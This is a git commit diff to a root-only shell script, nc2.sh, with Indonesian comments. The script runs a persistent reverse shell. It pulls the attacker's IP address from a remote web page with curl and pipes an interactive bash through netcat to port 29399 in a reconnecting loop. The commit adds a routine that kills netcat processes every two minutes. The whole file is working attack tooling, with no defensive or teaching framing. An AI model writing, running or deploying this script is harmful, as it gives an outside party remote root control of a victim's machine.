9d522fb189c3f75e3e2b4d8e4c37aad2fd5c7756
ibnusaja <45093115+ibnusaja@users.noreply.github.com>
2023-05-08 17:38:49 +0800

    Update nc2.sh

--- linux/nc2.sh
+++ linux/nc2.sh
@@ -4,6 +4,14 @@ if [[ "$(id -u)" != "0" ]];then
  exit 0
 fi
 
+matikanNc() {
+   # ini akan mematikan nc di tiap 120 detik
+   sleep 10
+   while [ "$(pgrep -f nc)" != "" ]; do sleep 120; echo "dimatikan"; kill -9 $(pgrep -f nc); done
+   echo "jalan"
+   exit 0
+}
+
 rm -rf /tmp/f
 
 mkfifo /tmp/f
@@ -13,8 +21,10 @@ while true; do
  if [ "$(pgrep -f ./nc)" = "" ]; then
   IP=$(curl -s https://ibnusaja.nasihosting.com/temp.txt)
   PORT="29399"
+  matikanNc > /dev/null 2> /dev/null &
   cat /tmp/f | /bin/bash -i 2>&1 | nc $IP $PORT > /tmp/f
  fi
- echo "sudah jalan"
+
+ # echo "sudah jalan"
  sleep 30
 done
